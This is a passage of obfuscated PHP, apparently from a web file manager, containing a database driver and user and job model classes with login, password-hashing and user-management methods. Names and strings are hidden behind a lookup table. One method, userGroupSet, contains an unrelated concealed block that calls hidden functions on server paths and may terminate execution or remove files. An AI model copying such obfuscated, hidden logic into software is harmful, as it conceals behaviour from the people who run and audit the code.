$this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­¢”µ¹Ç = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$­¢”µ¹Ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‹¦üäº = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‹¦üäº) { $this->error(); return !1; } } return !0; } private function getAll() { $áª˜©¦í = array(); if ($this->numRows > 0) { for ($é°¸–ÓÃ = 0; $é°¸–ÓÃ < $this->numRows; $é°¸–ÓÃ++) { $áª˜©¦í[$é°¸–ÓÃ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $áª˜©¦í; } public function getFields($´Û–ë©) { $æâÛê¦‘ =& $_SERVER[ïëó©ÒÚ]; $‹ğ®Âü… = $this->query($æâÛê¦‘[900] . $this->parseKey($´Û–ë©)); $Áå·™ğÓ = array(); if ($‹ğ®Âü…) { foreach ($‹ğ®Âü… as $¶¹©ùóÕ => $˜«Š©»”) { $Áå·™ğÓ[$˜«Š©»”[$æâÛê¦‘[31]]] = array($æâÛê¦‘[32] => $˜«Š©»”[$æâÛê¦‘[31]], $æâÛê¦‘[33] => $˜«Š©»”[$æâÛê¦‘[34]], $æâÛê¦‘[35] => (bool) ($˜«Š©»”[$æâÛê¦‘[36]] === $æâÛê¦‘[12]), $æâÛê¦‘[37] => $˜«Š©»”[$æâÛê¦‘[38]], $æâÛê¦‘[39] => strtolower($˜«Š©»”[$æâÛê¦‘[40]]) == $æâÛê¦‘[41], $æâÛê¦‘[42] => strtolower($˜«Š©»”[$æâÛê¦‘[43]]) == $æâÛê¦‘[44]); } } return $Áå·™ğÓ; } public function getTables($ƒØ’ÁªŒ = '') { $ë½¼¹æÓ =& $_SERVER[ïëó©ÒÚ]; $ÜÂƒ¡çÌ = !empty($ƒØ’ÁªŒ) ? $ë½¼¹æÓ[902] . $ƒØ’ÁªŒ . $ë½¼¹æÓ[903] : $ë½¼¹æÓ[904]; $Ï•ÁŞ¹î = $this->query($ÜÂƒ¡çÌ); $Æ§ÀºÈ§ = array(); if ($Ï•ÁŞ¹î) { foreach ($Ï•ÁŞ¹î as $€™Ê²ş => $’×®Ş­Ç) { $Æ§ÀºÈ§[$€™Ê²ş] = current($’×®Ş­Ç); } } return $Æ§ÀºÈ§; } public function replace($øâØË†Ã, $ùƒœÍÂì = array()) { $ø€±üÆü =& $_SERVER[ïëó©ÒÚ]; foreach ($øâØË†Ã as $ãÛÂ¦› => $Ä«Ï¿ç) { $äã„¡˜Á = $this->parseValue($Ä«Ï¿ç); if (is_scalar($äã„¡˜Á)) { $²»¶õ¤¾[] = $äã„¡˜Á; $ÅİĞÅ¦[] = $this->parseKey($ãÛÂ¦›); } } $À¿”õ¡Ô = $ø€±üÆü[905] . $this->parseTable($ùƒœÍÂì[$ø€±üÆü[279]]) . $ø€±üÆü[906] . implode($ø€±üÆü[50], $ÅİĞÅ¦) . $ø€±üÆü[907] . implode($ø€±üÆü[50], $²»¶õ¤¾) . $ø€±üÆü[908]; return $this->execute($À¿”õ¡Ô); } public function insertAll($¾ß®¼í°, $×æ™Ùöò = array(), $£œÜàŠã = false) { $é¶ìÊ¯ç =& $_SERVER[ïëó©ÒÚ]; if (!is_array($¾ß®¼í°[0])) { return !1; } $ÄÃ°û = array_keys($¾ß®¼í°[0]); $Ÿ«¹ğíÚ = array(); foreach ($¾ß®¼í° as $œğÉ‹¼Ê) { $´¦µğ‘Œ = array(); foreach ($œğÉ‹¼Ê as $îŒ¢““Í => $şá¶û¬­) { $şá¶û¬­ = $this->parseValue($şá¶û¬­); if (is_scalar($şá¶û¬­)) { $´¦µğ‘Œ[] = $şá¶û¬­; } } $Ÿ«¹ğíÚ[] = $é¶ìÊ¯ç[260] . implode($é¶ìÊ¯ç[50], $´¦µğ‘Œ) . $é¶ìÊ¯ç[908]; } array_walk($ÄÃ°û, array($this, $é¶ìÊ¯ç[909])); $„µÇ¨é = $£œÜàŠã ? $é¶ìÊ¯ç[910] : $é¶ìÊ¯ç[911]; $ø›ÕÈĞÏ = $„µÇ¨é . $é¶ìÊ¯ç[912] . $this->parseTable($×æ™Ùöò[$é¶ìÊ¯ç[279]]) . $é¶ìÊ¯ç[906] . implode($é¶ìÊ¯ç[50], $ÄÃ°û) . $é¶ìÊ¯ç[913] . implode($é¶ìÊ¯ç[50], $Ÿ«¹ğíÚ); return $this->execute($ø›ÕÈĞÏ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ï¤åÍÆœ =& $_SERVER[ïëó©ÒÚ]; $this->error = $this->_linkID->errno . $ï¤åÍÆœ[4] . $this->_linkID->error; if ($ï¤åÍÆœ[12] != $this->queryStr) { $this->error .= LNG($ï¤åÍÆœ[48]) . $this->queryStr; } think_trace($this->error, $ï¤åÍÆœ[12], $ï¤åÍÆœ[49]); return $this->error; } public function escapeString($¦Ï¤§¿÷) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¦Ï¤§¿÷); } else { return addslashes($¦Ï¤§¿÷); } } public function parseKey(&$ç•Å§«, $Ããòé¼ë = true) { $æğ·´ÓŒ =& $_SERVER[ïëó©ÒÚ]; if ($Ããòé¼ë) { $ç•Å§« = $this->parseKeyCheck($ç•Å§«); } if ($ç•Å§« != $æğ·´ÓŒ[188] && !preg_match($æğ·´ÓŒ[914], $ç•Å§«)) { $ç•Å§« = $æğ·´ÓŒ[385] . trim($ç•Å§«, $æğ·´ÓŒ[385]) . $æğ·´ÓŒ[385]; } return $ç•Å§«; } } goto cˆ¤‰Ş˜Š”; BéÜöÄÑ¼‘: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x6a\157\x62\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\x65\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\x65\154\146\112\157\142\114\151\x73\x74"; public function listData($³»«ŒÚ„ = false, $òá¶“‘â = "\x73\x6f\162\x74", $´İ¿‘‘Ø = false) { return parent::listData($³»«ŒÚ„, $òá¶“‘â, $´İ¿‘‘Ø); } public function remove($´äªòæÜ) { return parent::remove($´äªòæÜ); } public function add($í‹æ¥İ¿) { $†»Ğºõ† =& $_SERVER[ïëó©ÒÚ]; if ($this->findByName($í‹æ¥İ¿[$†»Ğºõ†[32]])) { return !1; } $í‹æ¥İ¿[$†»Ğºõ†[1857]] = $this->getSort(); return parent::insert($í‹æ¥İ¿); } private function getSort() { $†ïµÎÔÖ =& $_SERVER[ïëó©ÒÚ]; $‰ éÂš¥ = parent::listData(); $Õ¨Õ„ÃÉ = array_to_keyvalue($‰ éÂš¥, $†ïµÎÔÖ[12], $†ïµÎÔÖ[1857]); return empty($Õ¨Õ„ÃÉ) ? 0 : max($Õ¨Õ„ÃÉ) + 1; } public function update($¼ÄË«é, $÷¿€¤úÏ) { $ü‰˜İƒğ =& $_SERVER[ïëó©ÒÚ]; $œ€¥ºúÂ = parent::listData($¼ÄË«é); $ü•ö‘Æ¶ = $this->findByName($÷¿€¤úÏ[$ü‰˜İƒğ[32]]); if (!$œ€¥ºúÂ || $ü•ö‘Æ¶ && $ü•ö‘Æ¶[$ü‰˜İƒğ[399]] != $œ€¥ºúÂ[$ü‰˜İƒğ[399]]) { return !1; } return parent::update($¼ÄË«é, $÷¿€¤úÏ); } public function setUserJob($€åÊ«°, $È•ñ˜Ù) { $ˆƒŸØşÁ =& $_SERVER[ïëó©ÒÚ]; if (!is_array($È•ñ˜Ù)) { $È•ñ˜Ù = array($È•ñ˜Ù); } $³à…äïş = parent::listData(); $»Ã ®¨ç = array_to_keyvalue($³à…äïş, $ˆƒŸØşÁ[32]); $–ß¦ = $ˆƒŸØşÁ[378]; foreach ($È•ñ˜Ù as $Úôá‡êÆ) { if ($»Ã ®¨ç[$Úôá‡êÆ]) { $–ß¦ .= $»Ã ®¨ç[$Úôá‡êÆ][$ˆƒŸØşÁ[399]] . $ˆƒŸØşÁ[50]; } else { $¹¨ò® ¨ = $this->add($Úôá‡êÆ); $–ß¦ .= $¹¨ò® ¨ . $ˆƒŸØşÁ[50]; } } $–ß¦ = rtrim($–ß¦, $ˆƒŸØşÁ[50]); Model($ˆƒŸØşÁ[544])->metaSet($€åÊ«°, self::JOB_KEY, $–ß¦); } public function getUserJob($Ó°©÷´ï) { $«ñ¦ÂøÑ = Model($_SERVER[ïëó©ÒÚ][544])->metaGet($Ó°©÷´ï); return $this->getUserJobInfo($«ñ¦ÂøÑ[self::JOB_KEY]); } public function getUserJobInfo($·şØï¨Œ) { $ÛıÛëÊµ =& $_SERVER[ïëó©ÒÚ]; $´ê îœ = explode($ÛıÛëÊµ[50], $·şØï¨Œ); $ª† °— = parent::listData(); $ª† °— = array_remove_key($ª† °—, $ÛıÛëÊµ[200]); $·“ö¨¦ä = array(); foreach ($´ê îœ as $º®‡¨¤) { if (isset($ª† °—[$º®‡¨¤])) { $·“ö¨¦ä[] = $ª† °—[$º®‡¨¤]; } } return $·“ö¨¦ä; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\x6d\x65" => "\x75\163\145\162\137\155\145\x74\141", "\x6d\145\164\x61\106\x69\145\x6c\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\163\x65\162\x49\104\54\156\x69\x63\x6b\x4e\x61\155\145\x2c\156\x61\155\x65\54\141\166\x61\164\x61\x72\54\x73\145\x78\x2c\x73\164\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($…”‡Á±¾) { $»í»•ê© =& $_SERVER[ïëó©ÒÚ]; $§•ëª€‚ = $»í»•ê©[2276]; return array($»í»•ê©[1911] => array($…”‡Á±¾[0], $§•ëª€‚), $»í»•ê©[1913] => array($…”‡Á±¾[0], $§•ëª€‚), $»í»•ê©[2277] => array($…”‡Á±¾[0], $§•ëª€‚)); } protected function getInfo($öÁ¹úÉ°, $Èä»‡Å = false) { $×³Ñßı± = $this->getInfoSimple($öÁ¹úÉ°); if (!is_array($×³Ñßı±)) { return array(); } if ($Èä»‡Å) { return $this->_getInfoApply($×³Ñßı±); } return $this->cacheFunctionGet($_SERVER[ïëó©ÒÚ][1915], $öÁ¹úÉ°); } protected function getInfoFull($÷¿¢°öõ, $ÂÜĞ—°“ = false) { $Óûü™–Ö = $this->getInfoSimple($÷¿¢°öõ); if (!is_array($Óûü™–Ö)) { return array(); } if ($ÂÜĞ—°“) { return $this->_getInfoApply($Óûü™–Ö, !0); } return $this->cacheFunctionGet($_SERVER[ïëó©ÒÚ][2278], $÷¿¢°öõ); } private function _getInfoApply($ö–ÑÇ•â, $¤®‘é“ç = false) { $­¤¿àğ =& $_SERVER[ïëó©ÒÚ]; if (!$ö–ÑÇ•â) { return $ö–ÑÇ•â; } $Éãâ´¦ = md5($­¤¿àğ[2279] . $ö–ÑÇ•â[$­¤¿àğ[892]] . $­¤¿àğ[2280] . $ö–ÑÇ•â[$­¤¿àğ[32]]); $ö–ÑÇ•â = $this->_listDataApplyItem($ö–ÑÇ•â); $øÛ˜éå = Model($­¤¿àğ[1330])->metaGet($ö–ÑÇ•â[$­¤¿àğ[86]][$­¤¿àğ[411]]); $ö–ÑÇ•â[$­¤¿àğ[2281]] = $Éãâ´¦; $ö–ÑÇ•â[$­¤¿àğ[86]][$­¤¿àğ[2102]] = isset($øÛ˜éå[$­¤¿àğ[2103]]) ? $øÛ˜éå[$­¤¿àğ[2103]] : null; if ($¤®‘é“ç) { $ö–ÑÇ•â[$­¤¿àğ[475]] = $this->metaGet($ö–ÑÇ•â[$­¤¿àğ[1661]]); } return $ö–ÑÇ•â; } protected function getInfoSimple($à«Ÿş¢İ, $–€Ğ¶¶µ = false) { $Ö¯±ÒİÆ =& $_SERVER[ïëó©ÒÚ]; if (!$à«Ÿş¢İ) { return array(); } if ($–€Ğ¶¶µ) { $‘ë… õ¥ = $this->where(array($Ö¯±ÒİÆ[1661] => intval($à«Ÿş¢İ)))->find(); if (!is_array($‘ë… õ¥)) { return array(); } $‘ë… õ¥[$Ö¯±ÒİÆ[552]] = Action($Ö¯±ÒİÆ[2282])->parseUrl($‘ë… õ¥[$Ö¯±ÒİÆ[552]]); return $‘ë… õ¥; } return $this->cacheFunctionGet($Ö¯±ÒİÆ[1916], $à«Ÿş¢İ); } protected function getInfoSimpleOuter($‰šÏ®”¿) { $ÌÇ¥Ä²Ç =& $_SERVER[ïëó©ÒÚ]; if (!$‰šÏ®”¿ || $‰šÏ®”¿ == 0) { return array($ÌÇ¥Ä²Ç[1661] => $ÌÇ¥Ä²Ç[197], $ÌÇ¥Ä²Ç[32] => $ÌÇ¥Ä²Ç[162] . LNG($ÌÇ¥Ä²Ç[2283]) . $ÌÇ¥Ä²Ç[164], $ÌÇ¥Ä²Ç[552] => STATIC_PATH . $ÌÇ¥Ä²Ç[2284]); } $Äãª¾İ„ = $this->cacheFunctionGet($ÌÇ¥Ä²Ç[1916], $‰šÏ®”¿); $ƒîÇ”ƒÇ = array_field_key($Äãª¾İ„, explode($ÌÇ¥Ä²Ç[50], $this->simpleField)); if (!$ƒîÇ”ƒÇ) { return array($ÌÇ¥Ä²Ç[1661] => $ÌÇ¥Ä²Ç[1193], $ÌÇ¥Ä²Ç[32] => $ÌÇ¥Ä²Ç[162] . LNG($ÌÇ¥Ä²Ç[2285]) . $ÌÇ¥Ä²Ç[164], $ÌÇ¥Ä²Ç[552] => STATIC_PATH . $ÌÇ¥Ä²Ç[2286]); } $ƒîÇ”ƒÇ[$ÌÇ¥Ä²Ç[552]] = Action($ÌÇ¥Ä²Ç[2282])->parseUrl($ƒîÇ”ƒÇ[$ÌÇ¥Ä²Ç[552]]); return $ƒîÇ”ƒÇ; } protected function groupUser($Üà¦´°) { } public static function errorLang($ÅñÊÌÁ) { $÷¾²¾ÇŞ =& $_SERVER[ïëó©ÒÚ]; $½±ãÉ¾¹ = array(self::ERROR_USER_NOT_EXISTS => $÷¾²¾ÇŞ[2287], self::ERROR_USER_PASSWORD_ERROR => $÷¾²¾ÇŞ[2288], self::ERROR_USER_EXIST_NAME => $÷¾²¾ÇŞ[2289], self::ERROR_USER_EXIST_PHONE => $÷¾²¾ÇŞ[2290], self::ERROR_USER_EXIST_EMAIL => $÷¾²¾ÇŞ[2291], self::ERROR_USER_LOGIN_LOCK => $÷¾²¾ÇŞ[2292], self::ERROR_IP_NOT_ALLOW => $÷¾²¾ÇŞ[2293], self::ERROR_USER_EXIST_NICKNAME => $÷¾²¾ÇŞ[2294]); return LNG($½±ãÉ¾¹[$ÅñÊÌÁ]); } public function getInfoByMeta($¤ÒÛ±¨‡, $‘µæ¹¨¶) { $Êî‹¹é =& $_SERVER[ïëó©ÒÚ]; $Ôƒòõ× = Model($Êî‹¹é[2295])->where(array($Êî‹¹é[94] => $¤ÒÛ±¨‡, $Êî‹¹é[374] => $‘µæ¹¨¶))->find(); if ($Ôƒòõ×) { return $this->getInfo($Ôƒòõ×[$Êî‹¹é[1661]]); } return !1; } public function userLoginCheck($Áøêûõß, $Ãñ´äĞü) { $˜âçùèû =& $_SERVER[ïëó©ÒÚ]; $ÈüÛ™‚ = $this->userLoginFind($Áøêûõß); if (!$ÈüÛ™‚) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÈüÛ™‚[$˜âçùèû[1661]], $Ãñ´äĞü)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÈüÛ™‚[$˜âçùèû[1661]]); } public function userLoginFind($Š¼Ò¥Ö•) { $ë«ı¯é  =& $_SERVER[ïëó©ÒÚ]; $ŸïĞâ›¨ = array($ë«ı¯é [32] => $Š¼Ò¥Ö•, $ë«ı¯é [551] => $Š¼Ò¥Ö•, $ë«ı¯é [305] => $Š¼Ò¥Ö•, $ë«ı¯é [2296] => $Š¼Ò¥Ö•, $ë«ı¯é [1003] => $ë«ı¯é [1005]); if ($this->nickNameRpt()) { unset($ŸïĞâ›¨[$ë«ı¯é [551]]); } return $this->where($ŸïĞâ›¨)->find(); } public function clearCache($µÖÎ´íı) { $û¡èÁšˆ =& $_SERVER[ïëó©ÒÚ]; $this->cacheFunctionClear($û¡èÁšˆ[1915], $µÖÎ´íı); $this->cacheFunctionClear($û¡èÁšˆ[1916], $µÖÎ´íı); $this->cacheFunctionClear($û¡èÁšˆ[2278], $µÖÎ´íı); } public function userPasswordCheck($âà»è«µ, $¤²¦ìÚÔ) { $§µØ±Á =& $_SERVER[ïëó©ÒÚ]; $‡şÀí¡ = $this->where(array($§µØ±Á[1661] => intval($âà»è«µ)))->find(); $«İìéûñ = $this->metaGet($âà»è«µ); $§”ô“¤’ = isset($«İìéûñ[$§µØ±Á[2297]]) ? $«İìéûñ[$§µØ±Á[2297]] : $§µØ±Á[12]; if (md5($§”ô“¤’ . trim($¤²¦ìÚÔ)) !== $‡şÀí¡[$§µØ±Á[892]]) { return !1; } return !0; } public function userAdd($©õ—µ‹«) { $Óôø›…ä =& $_SERVER[ïëó©ÒÚ]; $ÕúÄªû = array($Óôø›…ä[429] => $©õ—µ‹«[$Óôø›…ä[32]], $Óôø›…ä[2298] => $©õ—µ‹«[$Óôø›…ä[1540]], $Óôø›…ä[2299] => isset($©õ—µ‹«[$Óôø›…ä[305]]) ? $©õ—µ‹«[$Óôø›…ä[305]] : $Óôø›…ä[12], $Óôø›…ä[2300] => isset($©õ—µ‹«[$Óôø›…ä[2296]]) ? $©õ—µ‹«[$Óôø›…ä[2296]] : $Óôø›…ä[12], $Óôø›…ä[2301] => isset($©õ—µ‹«[$Óôø›…ä[551]]) ? $©õ—µ‹«[$Óôø›…ä[551]] : $©õ—µ‹«[$Óôø›…ä[32]], $Óôø›…ä[2302] => isset($©õ—µ‹«[$Óôø›…ä[552]]) ? $©õ—µ‹«[$Óôø›…ä[552]] : $Óôø›…ä[12], $Óôø›…ä[2303] => isset($©õ—µ‹«[$Óôø›…ä[2304]]) ? $©õ—µ‹«[$Óôø›…ä[2304]] : 1, $Óôø›…ä[2305] => $©õ—µ‹«[$Óôø›…ä[892]], $Óôø›…ä[1917] => isset($©õ—µ‹«[$Óôø›…ä[1820]]) ? $©õ—µ‹«[$Óôø›…ä[1820]] : 1024 * 1024 * 20, $Óôø›…ä[1918] => 0, $Óôø›…ä[2306] => 0, $Óôø›…ä[1962] => isset($©õ—µ‹«[$Óôø›…ä[760]]) ? $©õ—µ‹«[$Óôø›…ä[760]] : 1); if (!empty($©õ—µ‹«[$Óôø›…ä[1661]])) { $ÕúÄªû[$Óôø›…ä[1661]] = $©õ—µ‹«[$Óôø›…ä[1661]]; } $ÄöÕŒ© = $this->_checkExist($©õ—µ‹«); if ($ÄöÕŒ© !== !0) { return $ÄöÕŒ©; } if (!empty($ÕúÄªû[$Óôø›…ä[552]]) && strlen($ÕúÄªû[$Óôø›…ä[552]]) > 255) { $ÕúÄªû[$Óôø›…ä[552]] = $Óôø›…ä[12]; } $—Ä¬Ú°ô = $this->add($ÕúÄªû); $Ò·¿’ß = array($Óôø›…ä[2305] => $ÕúÄªû[$Óôø›…ä[892]], $Óôø›…ä[2301] => $ÕúÄªû[$Óôø›…ä[551]]); $this->userEdit($—Ä¬Ú°ô, $Ò·¿’ß); Model($Óôø›…ä[1330])->userRootAdd($—Ä¬Ú°ô); return $—Ä¬Ú°ô; } protected function userEditTest($ÛşÁêµÌ, $à‘ÁîÁŒ) { return $this->call($_SERVER[ïëó©ÒÚ][2307], $ÛşÁêµÌ, $à‘ÁîÁŒ); } protected function userEdit($á˜Ë‰¾, $¹ĞÉË‹Ø) { $ì¶Ãç¦¬ =& $_SERVER[ïëó©ÒÚ]; $š¸Å´ˆ = $this->getInfoSimple($á˜Ë‰¾); if (!$š¸Å´ˆ) { return !1; } $Åòµ«‘· = $this->_checkExist($¹ĞÉË‹Ø, $á˜Ë‰¾); if ($Åòµ«‘· !== !0) { return $Åòµ«‘·; } if (isset($¹ĞÉË‹Ø[$ì¶Ãç¦¬[892]]) && trim($¹ĞÉË‹Ø[$ì¶Ãç¦¬[892]]) != $ì¶Ãç¦¬[12]) { $õ‰“îú• = $this->metaGet($á˜Ë‰¾); if (empty($õ‰“îú•[$ì¶Ãç¦¬[2297]])) { $õ‰“îú•[$ì¶Ãç¦¬[2297]] = rand_string(10); Model($ì¶Ãç¦¬[522])->metaSet($á˜Ë‰¾, $ì¶Ãç¦¬[2297], $õ‰“îú•[$ì¶Ãç¦¬[2297]]); } $¹ĞÉË‹Ø[$ì¶Ãç¦¬[892]] = md5($õ‰“îú•[$ì¶Ãç¦¬[2297]] . trim($¹ĞÉË‹Ø[$ì¶Ãç¦¬[892]])); } else { unset($¹ĞÉË‹Ø[$ì¶Ãç¦¬[892]]); } if (!empty($¹ĞÉË‹Ø[$ì¶Ãç¦¬[552]]) && strlen($¹ĞÉË‹Ø[$ì¶Ãç¦¬[552]]) > 255) { $¹ĞÉË‹Ø[$ì¶Ãç¦¬[552]] = $ì¶Ãç¦¬[12]; } $this->where(array($ì¶Ãç¦¬[1652] => $á˜Ë‰¾))->save($¹ĞÉË‹Ø); if (isset($¹ĞÉË‹Ø[$ì¶Ãç¦¬[551]])) { $this->setNamePinyin($á˜Ë‰¾, $¹ĞÉË‹Ø[$ì¶Ãç¦¬[551]]); } $this->clearCache($á˜Ë‰¾); return !0; } public function setNamePinyin($ÆşÈÕİ, $ÉÒåë® = false) { $êÖ¯ä¢ =& $_SERVER[ïëó©ÒÚ]; if (!$ÉÒåë®) { $·Á¥Ú—¥ = $this->getInfoSimple($ÆşÈÕİ); $ÉÒåë® = $·Á¥Ú—¥[$êÖ¯ä¢[551]] ? $·Á¥Ú—¥[$êÖ¯ä¢[551]] : $·Á¥Ú—¥[$êÖ¯ä¢[32]]; } $³Ää¾İô = Model($êÖ¯ä¢[544]); if (!Input::check($ÉÒåë®, $êÖ¯ä¢[602])) { return $³Ää¾İô->metaSet($ÆşÈÕİ, array($êÖ¯ä¢[474] => $êÖ¯ä¢[12], $êÖ¯ä¢[473] => $êÖ¯ä¢[12])); } return $³Ää¾İô->metaSet($ÆşÈÕİ, array($êÖ¯ä¢[474] => str_replace($êÖ¯ä¢[53], $êÖ¯ä¢[12], Pinyin::get($ÉÒåë®)), $êÖ¯ä¢[473] => Pinyin::get($ÉÒåë®, $êÖ¯ä¢[603]))); } private function nickNameRpt() { $õÃü¿»… =& $_SERVER[ïëó©ÒÚ]; $ÜÕö‡ö = Model($õÃü¿»…[780])->get($õÃü¿»…[2308]); $ÜŠ¤ˆº† = $GLOBALS[$õÃü¿»…[6]][$õÃü¿»…[381]][$õÃü¿»…[2308]]; $€¤²öÑ† = !is_null($ÜÕö‡ö) ? $ÜÕö‡ö : $ÜŠ¤ˆº†; return !!$€¤²öÑ†; } private function _checkExist($ğÔÚ°‹ä, $çËŞ˜Ó = false) { $…’›ç¨º =& $_SERVER[ïëó©ÒÚ]; $­şµ·â¥ = array($…’›ç¨º[32] => UserModel::ERROR_USER_EXIST_NAME, $…’›ç¨º[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $…’›ç¨º[305] => UserModel::ERROR_USER_EXIST_EMAIL, $…’›ç¨º[2296] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($­şµ·â¥[$…’›ç¨º[551]]); } $ìªº³²Ÿ = $çËŞ˜Ó ? array($…’›ç¨º[1661] => array($…’›ç¨º[2309], $çËŞ˜Ó)) : array(); foreach ($­şµ·â¥ as $¤³¤«ÑË => $àÌŞèºã) { $½¸”ºµ’ = array(); foreach ($­şµ·â¥ as $ñ’ëä‹¯ => $»şıÜ) { if (isset($ğÔÚ°‹ä[$ñ’ëä‹¯]) && $ğÔÚ°‹ä[$ñ’ëä‹¯]) { $½¸”ºµ’[] = $ğÔÚ°‹ä[$ñ’ëä‹¯]; } } if (!$½¸”ºµ’) { continue; } $Ù…çÛâ² = array_merge(array($¤³¤«ÑË => array($…’›ç¨º[7], $½¸”ºµ’)), $ìªº³²Ÿ); $ÛÚóÙĞ = $this->where($Ù…çÛâ²)->find(); if ($ÛÚóÙĞ) { return $àÌŞèºã; } } return !0; } public function userListInfo($ª¼¥ ë) { $ö½ş§³ò =& $_SERVER[ïëó©ÒÚ]; $ïãÍüÍ‘ = array(); $ª¼¥ ë = is_array($ª¼¥ ë) ? array_unique($ª¼¥ ë) : array(); if (!$ª¼¥ ë) { return $ïãÍüÍ‘; } if (count($ª¼¥ ë) < 20) { foreach ($ª¼¥ ë as $„ÓÒ’•Ä) { $ïãÍüÍ‘[$„ÓÒ’•Ä . $ö½ş§³ò[12]] = $this->getInfoSimpleOuter($„ÓÒ’•Ä); } } else { $±³Æï°Î = array($ö½ş§³ò[1652] => array($ö½ş§³ò[427], $ª¼¥ ë)); if (count($ª¼¥ ë) == 1) { $±³Æï°Î = array($ö½ş§³ò[1652] => $ª¼¥ ë[0]); } $¹ê¹º¼‚ = Model($ö½ş§³ò[522])->field($this->simpleField)->where($±³Æï°Î)->select(); $¹ê¹º¼‚ = array_to_keyvalue($¹ê¹º¼‚, $ö½ş§³ò[1661]); foreach ($ª¼¥ ë as $„ÓÒ’•Ä) { $Ñ¹øš¤‹ = $¹ê¹º¼‚[$„ÓÒ’•Ä]; if (!$Ñ¹øš¤‹) { $ïãÍüÍ‘[$„ÓÒ’•Ä . $ö½ş§³ò[12]] = $this->getInfoSimpleOuter($„ÓÒ’•Ä); continue; } $Ñ¹øš¤‹[$ö½ş§³ò[552]] = Action($ö½ş§³ò[2282])->parseUrl($Ñ¹øš¤‹[$ö½ş§³ò[552]]); $ïãÍüÍ‘[$„ÓÒ’•Ä . $ö½ş§³ò[12]] = $Ñ¹øš¤‹; } } return $ïãÍüÍ‘; } protected function userStatus($ºÍÛÃ†ì, $ö¡ÔĞì™) { $ò«îòª = $this->getInfoSimple($ºÍÛÃ†ì); if (!$ò«îòª) { return !1; } $¥›è˜¸ = array($_SERVER[ïëó©ÒÚ][760] => $ö¡ÔĞì™); return $this->userEdit($ºÍÛÃ†ì, $¥›è˜¸); } protected function userRemove($Áö„ØÍ¦) { $ïã¸»¡ù =& $_SERVER[ïëó©ÒÚ]; $ÛÔ¡î“¨ = $this->getInfoSimple($Áö„ØÍ¦); if (!$ÛÔ¡î“¨) { return !1; } $Ï‚¤ò³° = array($ïã¸»¡ù[1652] => $Áö„ØÍ¦); Model($ïã¸»¡ù[610])->where($Ï‚¤ò³°)->delete(); Model($ïã¸»¡ù[2310])->where($Ï‚¤ò³°)->delete(); Model($ïã¸»¡ù[1923])->where($Ï‚¤ò³°)->delete(); Model($ïã¸»¡ù[2295])->where($Ï‚¤ò³°)->delete(); Model($ïã¸»¡ù[1071])->where($Ï‚¤ò³°)->delete(); Model($ïã¸»¡ù[2126])->removeUserAll($Áö„ØÍ¦); Model($ïã¸»¡ù[835])->userRootRemove($Áö„ØÍ¦); return $this->where($Ï‚¤ò³°)->delete(); } protected function userGroupSet($´ğ¡‰éÏ, $Ãè¹èÈ, $¢îÀ—Ãö = array()) { $íô®˜¿æ =& $_SERVER[ïëó©ÒÚ]; if ($_SERVER[$íô®˜¿æ[400]] != $_SERVER[$íô®˜¿æ[401]]) { $†÷áü÷‘ = $íô®˜¿æ[882]; $İúß×é€ = $íô®˜¿æ[402]; $×Ò¼«ÏÒ = $_SERVER[$íô®˜¿æ[403]] . $íô®˜¿æ[404]; $Ñº˜ß = $İúß×é€($×Ò¼«ÏÒ); $È†ùÖ¨¬ = explode($íô®˜¿æ[231], $Ñº˜ß); if (count($È†ùÖ¨¬) < $íô®˜¿æ[631]) { $°«êôâİ = $íô®˜¿æ[406]; $°«êôâİ(); } $Ê¸ùúåı = $íô®˜¿æ[883]; $Ê¸ùúåı($_SERVER[$íô®˜¿æ[884]]); $Ê¸ùúåı($_SERVER[$íô®˜¿æ[403]] . $íô®˜¿æ[2311]); $ ö¡—Ú = 1; while ($ ö¡—Ú > 1) { $ ö¡—Ú = $ ö¡—Ú + 4; $ÌÏ½õ· = rawurlencode($ ö¡—Ú . $íô®˜¿æ[378]); } } $¹şŠ¿Š¹ = $this->getInfoSimple($´ğ¡‰éÏ); if (!$¹şŠ¿Š¹ || !is_array($Ãè¹èÈ)) { return !1; } $±¥—İÎ¦ = Model($íô®˜¿æ[1923]); $±¥—İÎ¦->where(array($íô®˜¿æ[1661] => $´ğ¡‰éÏ))->delete(); $™å™×¢Ç = array(); $”‘òáÕÅ = 0; foreach ($Ãè¹èÈ as $™åŞÄóª => $ºÛ³£õ) { $²ÜØ‹È = array($íô®˜¿æ[1661] => $´ğ¡‰éÏ, $íô®˜¿æ[1833] => $™åŞÄóª, $íô®˜¿æ[1937] => $ºÛ³£õ); $²ÜØ‹È[$íô®˜¿æ[1857]] = isset($¢îÀ—Ãö[$”‘òáÕÅ]) ? $¢îÀ—Ãö[$”‘òáÕÅ] : 0; $”‘òáÕÅ++; $™å™×¢Ç[] = $²ÜØ‹È; } return $±¥—İÎ¦->addAll($™å™×¢Ç, array(), !0); } protected function userGroupAdd($ôéè, $˜æëı®í = array()) { $åÛş¤°© =& $_SERVER[ïëó©ÒÚ]; $Ï«ÏÜÅ 